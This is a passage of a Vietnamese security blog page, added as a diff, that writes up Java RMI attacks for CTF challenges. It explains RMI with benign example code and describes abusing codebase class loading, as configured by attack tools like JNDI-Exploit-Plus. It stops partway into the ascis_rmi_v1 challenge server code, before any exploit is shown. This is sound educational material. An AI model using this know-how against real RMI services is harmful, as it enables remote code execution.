@@ -1,0 +1,1185 @@
+
+
+<!DOCTYPE html>
+<html lang="en" itemscope itemtype="http://schema.org/WebPage">
+  <head>
+    
+
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+
+  <title>Rmi attack and some chall - &gt; root@l3mnt2010:~# ./exploit.py</title>
+  <meta name="description" content="RMI  RMI là gì? Example Dynamic class loading in RMI   SVATTT-Quals-2020: ascis_rmi_v1    Gadget chain   Chi tiết về quá trình xử lý khi register object với Registry của Server Chi tiết về quá trình xử lý khi lookup object với Registry của Client   SVATTT-Quals-2022: Waf-deserialize    .toc-container {position: fixed;left: 0;top: 100px; width: 350px; max-height: 80vh;overflow-y: auto;overflow-x: auto;padding: 20px;border-right: 1px solid #eee;background-color: black; z-index: 100;text-align: left; }.">
+  <meta name="author" content="l3mnt2010"/><script type="application/ld+json">
+{
+    "@context": "http://schema.org",
+    "@type": "WebSite",
+    "name": "\u003e root@l3mnt2010:~# .\/exploit.py",
+    
+    "url": "https:\/\/l3mnt2010.github.io\/"
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Organization",
+  "name": "",
+  "url": "https:\/\/l3mnt2010.github.io\/"
+  
+  
+  
+  
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [{
+        "@type": "ListItem",
+        "position": 1,
+        "item": {
+          "@id": "https:\/\/l3mnt2010.github.io\/",
+          "name": "home"
+        }
+    },{
+        "@type": "ListItem",
+        "position": 3,
+        "item": {
+          "@id": "https:\/\/l3mnt2010.github.io\/rmi-attack-and-some-chall\/",
+          "name": "Rmi attack and some chall"
+        }
+    }]
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Article",
+  "author": {
+    "name" : ""
+  },
+  "headline": "Rmi attack and some chall",
+  "description" : "RMI  RMI là gì? Example Dynamic class loading in RMI   SVATTT-Quals-2020: ascis_rmi_v1    Gadget chain   Chi tiết về quá trình xử lý khi register object với Registry của Server Chi tiết về quá trình xử lý khi lookup object với Registry của Client   SVATTT-Quals-2022: Waf-deserialize    \r\r\r\r\r.toc-container {\rposition: fixed;\rleft: 0;\rtop: 100px; width: 350px; max-height: 80vh;\roverflow-y: auto;\roverflow-x: auto;\rpadding: 20px;\rborder-right: 1px solid #eee;\rbackground-color: black; z-index: 100;\rtext-align: left; }\r.",
+  "inLanguage" : "en",
+  "wordCount":  3535 ,
+  "datePublished" : "0001-01-01T00:00:00\u002b00:00",
+  "dateModified" : "0001-01-01T00:00:00\u002b00:00",
+  "image" : "https:\/\/l3mnt2010.github.io\/avatar.png",
+  "keywords" : [ "Vietnamese, Java" ],
+  "mainEntityOfPage" : "https:\/\/l3mnt2010.github.io\/rmi-attack-and-some-chall\/",
+  "publisher" : {
+    "@type": "Organization",
+    "name" : "https:\/\/l3mnt2010.github.io\/",
+    "logo" : {
+        "@type" : "ImageObject",
+        "url" : "https:\/\/l3mnt2010.github.io\/avatar.png",
+        "height" :  60 ,
+        "width" :  60
+    }
+  }
+}
+</script>
+
+
+<meta property="og:title" content="Rmi attack and some chall" />
+<meta property="og:description" content="RMI  RMI là gì? Example Dynamic class loading in RMI   SVATTT-Quals-2020: ascis_rmi_v1    Gadget chain   Chi tiết về quá trình xử lý khi register object với Registry của Server Chi tiết về quá trình xử lý khi lookup object với Registry của Client   SVATTT-Quals-2022: Waf-deserialize    .toc-container {position: fixed;left: 0;top: 100px; width: 350px; max-height: 80vh;overflow-y: auto;overflow-x: auto;padding: 20px;border-right: 1px solid #eee;background-color: black; z-index: 100;text-align: left; }.">
+<meta property="og:image" content="https://l3mnt2010.github.io/avatar.png" />
+<meta property="og:url" content="https://l3mnt2010.github.io/rmi-attack-and-some-chall/" />
+<meta property="og:type" content="website" />
+<meta property="og:site_name" content="&gt; root@l3mnt2010:~# ./exploit.py" />
+
+  <meta name="twitter:title" content="Rmi attack and some chall" />
+  <meta name="twitter:description" content="RMI  RMI là gì? Example Dynamic class loading in RMI   SVATTT-Quals-2020: ascis_rmi_v1    Gadget chain   Chi tiết về quá trình xử lý khi register object với Registry của Server Chi tiết về quá trình …">
+  <meta name="twitter:image" content="https://l3mnt2010.github.io/avatar.png" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <link href='https://l3mnt2010.github.io/avatar.png' rel='icon' type='image/x-icon'/>
+  <meta name="generator" content="Hugo 0.83.1" />
+  <link rel="alternate" href="https://l3mnt2010.github.io/index.xml" type="application/rss+xml" title="&gt; root@l3mnt2010:~# ./exploit.py"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous"><link rel="stylesheet" href="https://l3mnt2010.github.io/css/main.css" /><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" />
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" /><link rel="stylesheet" href="https://l3mnt2010.github.io/css/syntax.css" /><link rel="stylesheet" href="https://l3mnt2010.github.io/css/codeblock.css" /><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css" integrity="sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css" integrity="sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R" crossorigin="anonymous">
+
+
+
+  </head>
+  <body>
+    <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
+  <div class="container-fluid">
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-navbar">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      <a class="navbar-brand" href="https://l3mnt2010.github.io/">&gt; root@l3mnt2010:~# ./exploit.py</a>
+    </div>
+
+    <div class="collapse navbar-collapse" id="main-navbar">
+      <ul class="nav navbar-nav navbar-right">
+        
+          
+            <li>
+              <a title="Home" href="https://l3mnt2010.github.io/">Home</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="Posts" href="https://l3mnt2010.github.io/posts">Posts</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="Write-up CTF" href="https://l3mnt2010.github.io/write-up">Write-up CTF</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="Tags" href="https://l3mnt2010.github.io/tags">Tags</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="About" href="https://l3mnt2010.github.io/about">About</a>
+            </li>
+          
+        
+
+        
+
+        
+      </ul>
+    </div>
+
+    
+      <div class="avatar-container">
+        <div class="avatar-img-border">
+          <a title="&gt; root@l3mnt2010:~# ./exploit.py" href="https://l3mnt2010.github.io/">
+            <img class="avatar-img" src="https://l3mnt2010.github.io/avatar.png" alt="&gt; root@l3mnt2010:~# ./exploit.py" />
+           
+          </a>
+        </div>
+      </div>
+    
+
+  </div>
+</nav>
+
+
+
+
+    
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+
+  
+  
+  
+
+
+
+
+
+
+  
+
+  <header class="header-section ">
+    
+    
+    <div class="intro-header no-img">
+      <div class="container">
+        <div class="row">
+          <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+            <div class="posts-heading">
+              
+                <h1>Rmi attack and some chall</h1>
+              
+              
+                <hr class="small">
+              
+              
+              
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  
+  </header>
+
+
+    
+<div class="container" role="main">
+  <div class="row">
+    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+      <article role="main" class="blog-post">
+        
+  <div class="toc-container">
+    <div class="toc">
+      <nav id="TableOfContents">
+        
+        <nav id="TableOfContents">
+  <ol>
+    <li>
+      <ol>
+        <li><a href="#rmi">RMI</a>
+          <ol>
+            <li><a href="#rmi-là-gì">RMI là gì?</a></li>
+            <li><a href="#example">Example</a></li>
+            <li><a href="#dynamic-class-loading-in-rmi">Dynamic class loading in RMI</a></li>
+          </ol>
+        </li>
+        <li><a href="#svattt-quals-2020-ascis_rmi_v1">SVATTT-Quals-2020: ascis_rmi_v1</a>
+          <ol>
+            <li>
+              <ol>
+                <li><a href="#gadget-chain">Gadget chain</a></li>
+              </ol>
+            </li>
+            <li><a href="#chi-tiết-về-quá-trình-xử-lý-khi-register-object-với-registry-của-server">Chi tiết về quá trình xử lý khi register object với Registry của Server</a></li>
+            <li><a href="#chi-tiết-về-quá-trình-xử-lý-khi-lookup-object-với-registry-của-client">Chi tiết về quá trình xử lý khi lookup object với Registry của Client</a></li>
+          </ol>
+        </li>
+        <li><a href="#svattt-quals-2022-waf-deserialize">SVATTT-Quals-2022: Waf-deserialize</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+      </nav>
+    </div>
+  </div>
+
+  <style>
+     
+    .toc-container {
+      position: fixed;
+      left: 0;
+      top: 100px;  
+      width: 350px;  
+      max-height: 80vh;
+      overflow-y: auto;
+      overflow-x: auto;
+      padding: 20px;
+      border-right: 1px solid #eee;
+      background-color: black;  
+      z-index: 100;
+      text-align: left;  
+    }
+
+    .toc {
+      font-size: 1.3rem;  
+      color: #fff;  
+      text-align: left;  
+    }
+
+    .toc h4 {
+      margin-top: 0;
+      margin-bottom: 1rem;
+      font-size: 1.3rem;  
+      text-align: left;  
+    }
+
+     
+    .toc ul, .toc ol {
+      padding-left: 0;  
+      margin: 0;
+      list-style-type: none;
+      text-align: left;  
+    }
+
+     
+    .toc ul ul, .toc ul ol, .toc ol ul, .toc ol ol {
+      padding-left: 10px;
+    }
+
+    .toc li {
+      padding: 10px 0;
+      line-height: 1.6;
+      text-align: left;  
+    }
+
+     
+    .toc a {
+      text-decoration: none;
+      display: block;
+      text-align: left;  
+      padding-left: 3px;  
+      font-size: 1.3rem;  
+      transition: color 0.2s;
+    }
+
+     
+    .toc > nav > ul > li > a {
+      color: #bb86fc;  
+      font-weight: bold;
+    }
+
+     
+    .toc > nav > ul > li > ul > li > a {
+      color: #ff4d4d;  
+    }
+
+     
+    .toc > nav > ul > li > ul > li > ul > li > a {
+      color: #4caf50;  
+    }
+
+     
+    .toc a:hover {
+      color: #ffcc00;  
+    }
+
+     
+    .toc a.active {
+      color: #ffcc00;  
+      font-weight: bold;
+      border-left: 4px solid #ffcc00;  
+      padding-left: 3px;  
+      margin-left: -5px;
+    }
+
+     
+    .main-content {
+      margin-left: 380px;  
+    }
+
+     
+    @media (max-width: 1200px) {
+      .toc-container {
+        width: 280px;  
+      }
+      .main-content {
+        margin-left: 320px;
+      }
+    }
+
+    @media (max-width: 900px) {
+      .toc-container {
+        position: static;
+        width: 100%;
+        max-height: none;
+        border-right: none;
+        border-bottom: 1px solid #eee;
+        margin-bottom: 20px;
+      }
+      .main-content {
+        margin-left: 0;
+      }
+    }
+  </style>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      
+      function highlightTOC() {
+        const headings = document.querySelectorAll('.main-content h1, .main-content h2, .main-content h3, .main-content h4, .main-content h5, .main-content h6');
+        const tocLinks = document.querySelectorAll('.toc a');
+
+        if (headings.length === 0 || tocLinks.length === 0) return;
+
+        let currentActiveIndex = -1;
+        const scrollPosition = window.scrollY;
+
+        for (let i = 0; i < headings.length; i++) {
+          const heading = headings[i];
+          const headingTop = heading.offsetTop - 100;
+          const headingBottom = headingTop + heading.offsetHeight;
+
+          if (scrollPosition >= headingTop && scrollPosition <= headingBottom) {
+            currentActiveIndex = i;
+            break;
+          }
+        }
+
+        tocLinks.forEach(link => link.classList.remove('active'));
+
+        if (currentActiveIndex >= 0) {
+          const currentHeading = headings[currentActiveIndex];
+          const headingId = currentHeading.id;
+
+          const correspondingLink = document.querySelector(`.toc a[href="#${headingId}"]`);
+          if (correspondingLink) {
+            correspondingLink.classList.add('active');
+
+            const tocContainer = document.querySelector('.toc-container');
+            const linkTop = correspondingLink.offsetTop;
+            const containerScrollTop = tocContainer.scrollTop;
+            const containerHeight = tocContainer.clientHeight;
+
+            if (linkTop < containerScrollTop || linkTop > containerScrollTop + containerHeight) {
+              tocContainer.scrollTop = linkTop - containerHeight / 2;
+            }
+          }
+        }
+      }
+
+      highlightTOC();
+      window.addEventListener('scroll', highlightTOC);
+      window.addEventListener('resize', highlightTOC);
+
+      const fragment = window.location.hash;
+      if (fragment) {
+        const element = document.querySelector(fragment);
+        if (element) {
+          element.scrollIntoView({ behavior: 'smooth' });
+
+          const tocLinks = document.querySelectorAll('.toc a');
+          tocLinks.forEach(link => {
+            link.classList.remove('active');
+            if (link.getAttribute('href') === fragment) {
+              link.classList.add('active');
+            }
+          });
+
+          highlightTOC();
+        }
+      }
+
+      const tocLinks = document.querySelectorAll('.toc a');
+      tocLinks.forEach(link => {
+        link.addEventListener('click', function(event) {
+          const targetId = link.getAttribute('href').substring(1);
+          const targetElement = document.getElementById(targetId);
+
+          if (targetElement) {
+            targetElement.scrollIntoView({ behavior: 'smooth' });
+
+            tocLinks.forEach(l => l.classList.remove('active'));
+            link.classList.add('active');
+
+            history.pushState(null, null, `#${targetId}`);
+
+            event.preventDefault();
+          }
+        });
+      });
+    });
+  </script>  
+
+
+<!-- raw HTML omitted -->
+<h2 id="rmi">RMI</h2>
+<h3 id="rmi-là-gì">RMI là gì?</h3>
+<ul>
+<li>rmi(remote method invocation) như tên gọi của nó thì dịch thẳng ra là đây là một phương pháp gọi phương thức từ xa</li>
+</ul>
+<p>Hiểu nôm na như sau:</p>
+<ul>
+<li>Tôi có mô hình như sau:</li>
+</ul>
+<ol>
+<li>Client - chứa interface <code>KCSCInterface</code> phải kế thừa Remote interface của package <code>rmi</code> có định nghĩa trước type dữ liệu của method playCTF thôi, nó hoàn toàn không có các lệnh được trình bày tại chính nó(client).</li>
+<li>Server</li>
+</ol>
+<ul>
+<li>server cũng có interface y hệt như trên không khác gì <code>KCSCInterface</code></li>
+<li>Có thêm một class <code>KCSCPlayCtfRemote</code> sẽ chứa lệnh triển khai cho method playCTF phải được kế thừa lớp <code>UnicastRemoteObject</code> và implements Interface ở trên ta nói.</li>
+<li>Tại class <code>KCSCPlayCtfRemote</code> sẽ định nghĩa contructor đủ kiểu và method ví dụ ta muốn sử dụng ở đây là playCTF.</li>
+</ul>
+<p>Yêu cầu đặt ra: Client muốn gọi method playCTF này nhưng không cần triển khai logic code của method này trên client.</p>
+<p>Và nhận thấy nếu việc phải định nghĩa(viết lại y hệt) lại chúng ở từng phía cụ thể ở đây ta sẽ phải viết lại ở client.</p>
+<p>Một trong những cách để giảm thiểu bộ nhớ cho việc này đó chính là rmi.</p>
+<p><img src="https://hackmd.io/_uploads/ByprGKS0Jl.png" alt="image"></p>
+<p>Đây là biểu đồ tuần tự cho quá trình này(ở dưới sẽ có một demo đơn giản cho dễ quan sát):</p>
+<p>1, Server sẽ tạo một instane từ class mà server muốn cung cấp qua rmi
+2, Mô hình kiểu trung gian (kiểu như danh bạ ấy - ở đây là Registry) và yêu cầu sẽ bắt đầu từ thằng skeleton nó sẽ reg đối tượng chính là cái instance vừa khởi tạo ở bước 1 với Registry - hiểu như là khai báo liên lạc với danh bạ, thì liên lạc ở đây là 1 obj. 
+3+4, Sau khi mà đăng ký xong thì lúc này thằng register đã có instance kia rồi, giờ thì client chỉ cần tìm kiếm đối tượng này theo tên đã đăng ký tại Registry -&gt; registry xử lí tìm sau đó trả về stub của đối tượng từ xa
+5+6, giờ chỉ cần gọi phương thức từ stub đó thôi, gọi như gọi ở local thôi và yêu cầu này sẽ được gửi đến stub xử lí (đóng gói thông tin phương thức) và gửi yêu cầu đến skeleton
+7+8, skeleton gọi phương thức thực tế sau đó trả về kết quả thực thi
+9+10, skeleton trả lại kết quả cho stub sau đó stub trả về client</p>
+<h3 id="example">Example</h3>
+<p>Interface dùng chung cho cả 2 phía:</p>
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">rmi</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">java.rmi.RemoteException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.rmi.Remote</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">interface</span> <span class="nc">KCSCInterface</span> <span class="kd">extends</span> <span class="n">Remote</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="n">String</span> <span class="nf">playCTF</span><span class="o">(</span><span class="n">String</span> <span class="n">name</span><span class="o">,</span> <span class="kt">boolean</span> <span class="n">solved</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">RemoteException</span><span class="o">;</span>
+<span class="o">}</span>
+</code></pre></div><p>Service server:</p>
+<p><img src="https://hackmd.io/_uploads/BJ_A_fICJl.png" alt="image"></p>
+<p>Đầu tiên thì như đã nói để register với Registry thì ta phải khai báo một instance trước:</p>
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">rmi</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">java.rmi.RemoteException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.rmi.server.UnicastRemoteObject</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">KCSCPlayCtfRemote</span> <span class="kd">extends</span> <span class="n">UnicastRemoteObject</span> <span class="kd">implements</span> <span class="n">KCSCInterface</span> <span class="o">{</span> <span class="c1">// tạo ra class Remote kế thừa UnicastRemoteObject và áp dụng trên interface khởi tạo trên cả client và server vừa kế thừa Remote Interface
+</span><span class="c1"></span>    <span class="kd">public</span> <span class="nf">KCSCPlayCtfRemote</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">RemoteException</span> <span class="o">{</span> <span class="c1">// contructor khởi tạo không tham số
+</span><span class="c1"></span>        <span class="kd">super</span><span class="o">();</span> <span class="c1">// gọi contructor của lớp cha là UnicastRemoteObject
+</span><span class="c1"></span>    <span class="o">}</span>
+
+    <span class="nd">@Override</span>
+    <span class="kd">public</span> <span class="n">String</span> <span class="nf">playCTF</span><span class="o">(</span><span class="n">String</span> <span class="n">name</span><span class="o">,</span> <span class="kt">boolean</span> <span class="n">solved</span><span class="o">)</span> <span class="o">{</span> <span class="c1">// khai báo phương thức playCTF override interface được áp dụng
+</span><span class="c1"></span>        <span class="k">return</span> <span class="s">&#34;Member name &#34;</span> <span class="o">+</span> <span class="n">name</span> <span class="o">+</span> <span class="s">&#34; playCTF very &#34;</span> <span class="o">+</span> <span class="o">(</span><span class="n">solved</span> <span class="o">?</span> <span class="s">&#34;good&#34;</span> <span class="o">:</span> <span class="s">&#34;bad&#34;</span><span class="o">);</span> <span class="c1">// trả ra chuỗi
+</span><span class="c1"></span>    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div><p>Tiếp sau đó là quá trình đăng kí bằng khởi tạo instance của obj này -&gt; gọi method <code>LocateRegistry#createRegistry</code> với port rmi server lắng nghe từ client(ở đây mình dùng 1099) -&gt; sau đó sẽ rebined instane này với rmi schema.</p>
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="kn">import</span> <span class="nn">rmi.KCSCInterface</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">rmi.KCSCPlayCtfRemote</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">java.rmi.Naming</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.rmi.registry.LocateRegistry</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Main</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="n">KCSCInterface</span> <span class="n">kcsc</span> <span class="o">=</span> <span class="k">new</span> <span class="n">KCSCPlayCtfRemote</span><span class="o">();</span> <span class="c1">// 1. service Impl
+</span><span class="c1"></span>            <span class="n">LocateRegistry</span><span class="o">.</span><span class="na">createRegistry</span><span class="o">(</span><span class="n">1099</span><span class="o">);</span> <span class="c1">// 2. create Registry
+</span><span class="c1"></span>            <span class="n">Naming</span><span class="o">.</span><span class="na">rebind</span><span class="o">(</span><span class="s">&#34;rmi://localhost:1099/kcsc&#34;</span><span class="o">,</span> <span class="n">kcsc</span><span class="o">);</span> <span class="c1">// 3. create rmi
+</span><span class="c1"></span>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;Server ready!&#34;</span><span class="o">);</span> <span class="c1">// print completed!
+</span><span class="c1"></span>        <span class="o">}</span>
+        <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div><p>Client:</p>
+<p><img src="https://hackmd.io/_uploads/Bksn_zL0yx.png" alt="image"></p>
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="kn">import</span> <span class="nn">rmi.KCSCInterface</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">java.rmi.Naming</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.rmi.registry.LocateRegistry</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.rmi.registry.Registry</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.Arrays</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Main</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="n">Registry</span> <span class="n">registry</span> <span class="o">=</span> <span class="n">LocateRegistry</span><span class="o">.</span><span class="na">getRegistry</span><span class="o">(</span><span class="s">&#34;localhost&#34;</span><span class="o">,</span> <span class="n">1099</span><span class="o">);</span> <span class="c1">// get all Registry
+</span><span class="c1"></span>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">Arrays</span><span class="o">.</span><span class="na">toString</span><span class="o">(</span><span class="n">registry</span><span class="o">.</span><span class="na">list</span><span class="o">()));</span> <span class="c1">// print array registry
+</span><span class="c1"></span>            <span class="n">KCSCInterface</span> <span class="n">stub</span> <span class="o">=</span> <span class="o">(</span><span class="n">KCSCInterface</span><span class="o">)</span> <span class="n">Naming</span><span class="o">.</span><span class="na">lookup</span><span class="o">(</span><span class="s">&#34;rmi://localhost:1099/kcsc&#34;</span><span class="o">);</span> <span class="c1">// lookup rmi
+</span><span class="c1"></span>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">stub</span><span class="o">.</span><span class="na">playCTF</span><span class="o">(</span><span class="s">&#34;l3mn2010&#34;</span><span class="o">,</span> <span class="kc">false</span><span class="o">));</span> <span class="c1">// call remote method
+</span><span class="c1"></span>        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">throw</span> <span class="k">new</span> <span class="n">RuntimeException</span><span class="o">(</span><span class="n">e</span><span class="o">);</span> <span class="c1">// throw runtime exception
+</span><span class="c1"></span>        <span class="o">}</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div><p>Tại client như đã nói thì chỉ có duy nhất interface KCSCInterface kế thừa interface Remote thôi -&gt; bắt đầu gọi đến Registry với <code>LocateRegistry#getRegistry(&quot;localhost&quot;, 1099)</code> lúc này registry sẽ là một mảng các instance mà Server đã đăng ký với Registry
+Và dùng Naming#lookup là static method với đối số rmi/tên instance đăng ký và giờ thì chỉ cần sử dụng nó thôi.</p>
+<ol>
+<li>Server listening:</li>
+</ol>
+<p><img src="https://hackmd.io/_uploads/ryGynMI0yl.png" alt="c8f12370c4db3159443950368edd83bd_Image1"></p>
+<ol start="2">
+<li>Client trigger rmi and call remote method:</li>
+</ol>
+<p><img src="https://hackmd.io/_uploads/Hy2FnGUCJe.png" alt="image"></p>
+<h3 id="dynamic-class-loading-in-rmi">Dynamic class loading in RMI</h3>
+<p>Rmi hỗ trợ tải lớp động, trường hợp nếu mà client gọi một đối tượng có thể deserial lên server thì nếu mà không tìm thấy class đó thì nó sẽ trả ra exception là <code>ClassNotFound</code> nhưng ở đây rmi load động cho nên nếu mà được cấu hình thì thằng rmi này sẽ thực hiện lấy những file class có thể từ một http server được cài đặt sẵn ở <code>System.setProperty(&quot;java.rmi.server.codebase&quot;, &quot;http://127.0.0.1:9999/&quot;)</code> hoặc là chạy java với option <code>-Djava.rmi.server.codebase=&quot;http://127.0.0.1:9999/&quot;</code></p>
+<p>Và trong custom của đa số tool attack rmi sẽ phải set mấy properites này:</p>
+<p>Ví dụ ở trong trường hợp của thằng JNDI-Exploit-Plus:</p>
+<p><img src="https://hackmd.io/_uploads/By3_bQL0yl.png" alt="image"></p>
+<p>Nó set <code>useCodebaseOnly</code> là <code>false</code> và mặc định nếu mà không có class này trên server thì sẽ tải nó ở http server đã chỉ định sẵn, ở trong thằng jndi này sẽ dùng jetty server được cấu hình set codebase thì mà start server khi khởi tạo.</p>
+<p><img src="https://hackmd.io/_uploads/HkafGXU0Jl.png" alt="image"></p>
+<h2 id="svattt-quals-2020-ascis_rmi_v1">SVATTT-Quals-2020: ascis_rmi_v1</h2>
+<p>Đề bài cho ta mã nguồn có cấu trúc khá tương tự như demo của ta ở trên:</p>
+<p>Server:</p>
+<ul>
+<li>Server sẽ khởi tạo một registry lắng nghe ở cổng rmi 1099 và đăng kí với giá trị instance của <code>ASCISInterfImpl</code> với name là <code>ascis</code>
+<img src="https://hackmd.io/_uploads/SkU7CUpR1e.png" alt="image"></li>
+</ul>
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="c1">//
+</span><span class="c1">// Source code recreated from a .class file by IntelliJ IDEA
+</span><span class="c1">// (powered by FernFlower decompiler)
+</span><span class="c1">//
+</span><span class="c1"></span>
+<span class="kn">package</span> <span class="nn">rmi</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">java.rmi.registry.LocateRegistry</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.rmi.registry.Registry</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">ASCISServer</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="nf">ASCISServer</span><span class="o">()</span> <span class="o">{</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="n">Registry</span> <span class="n">registry</span> <span class="o">=</span> <span class="n">LocateRegistry</span><span class="o">.</span><span class="na">createRegistry</span><span class="o">(</span><span class="n">1099</span><span class="o">);</span>
